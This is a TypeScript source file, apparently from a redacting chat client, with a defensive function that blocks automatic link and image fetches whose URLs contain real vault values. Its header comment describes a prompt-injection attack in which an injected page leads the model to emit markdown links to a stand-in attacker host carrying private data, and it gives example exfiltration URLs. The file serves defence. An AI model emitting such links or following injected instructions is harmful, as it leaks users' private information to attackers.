/**
 * "Does this RESOLVED url carry a real vault value?" — the one question that decides
 * whether an automatic network fetch is allowed to happen for a link or an image in a
 * model's reply. ONE implementation, because the link preview and the image loader are
 * the same hole seen twice.
 *
 * ## The attack
 *
 * The model only ever holds FAKES. A prompt-injected page can therefore make it emit
 * `[voir](https://attacker.tld/?d=Karl%20Studio)` or `![](https://attacker.tld/?d=Karl+Studio)`
 * with a fake it read in the conversation. `realLinkHref` then restores the REAL value —
 * correct for a CLICK, which is the user's own action and lands on the right page (rule
 * 11's outward-real) — and an automatic fetch of that URL hands the real value to an
 * attacker-chosen host with no user action at all. Repeat per fake: a fake→real oracle
 * over the whole vault. `safeFetch` blocks private hosts but has no public allow-list,
 * so the destination is entirely the attacker's.
 *
 * ## Why the previous test was not the test
 *
 * The gate used to be `href !== props.href` — "did un-redacting CHANGE the href?". That
 * only catches the encoded case. The whole reply is already un-redacted as plain text
 * BEFORE markdown parses it (`../../linkHref.ts` says so in full: `store.ts` `fromWire` →
 * `unredact`), so an UNENCODED fake in an href arrives already substituted: the before
 * and after are identical, the guard never fires, and the fetch goes out. The `%20`/`+`
 * forms were caught only because the literal `unredact` misses them and `unredactArgs`
 * has to fix them up later. The narrower case was guarded; the plain one was not.
 *
 * ## What this does instead
 *
 * It looks at the RESULT: does the url that would actually be fetched contain a value
 * from the vault? A vault maps `placeholder/fake → original`, so the values are the real
 * ones (the same access `rehypeRedact` → `segmentsWith` uses to light them up in the
 * text). Matching is case-insensitive and covers the percent- and `+`-encoded readings,
 * because a value inside a URL is routinely one of those and every one of them decodes
 * back to the same thing at the receiving server.
 *
 * ⚠️ It deliberately errs toward WITHHOLDING: a substring hit is enough, with no word
 * boundary and no length floor. A vault holding a short value will cost some previews.
 * That trade is not close — a withheld preview is a missing affordance, a fetched one is
 * a leaked identity, and the click still works either way.
 */

/** Every reading of `href` a receiving server would end up decoding to the same thing. */
function readings(href: string): string[] {
  const out = [href];
  const plus = href.replace(/\+/g, " "); // `application/x-www-form-urlencoded` spaces
  if (plus !== href) out.push(plus);
  for (const s of [...out]) {
    try {
      const decoded = decodeURIComponent(s);
      if (decoded !== s) out.push(decoded);
    } catch {
      /* a malformed %-escape decodes to nothing — the raw reading above still counts */
    }
  }
  return out.map((s) => s.toLowerCase());
}

/**
 * True when `href` contains any of the vault's REAL values. Absent href/vault ⇒ false
 * (nothing to leak, nothing to gate).
 */
export function hrefCarriesVaultValue(
  href: string | undefined,
  vault?: Record<string, string>,
): boolean {
  if (!href || !vault) return false;
  const forms = readings(href);
  // `Object.values` = the ORIGINALS (the vault is placeholder→original), which is what a
  // fetch would leak. The keys are the fakes the model already has; they leak nothing.
  for (const value of Object.values(vault)) {
    if (!value) continue;
    const needle = value.toLowerCase();
    if (forms.some((f) => f.includes(needle))) return true;
  }
  return false;
}
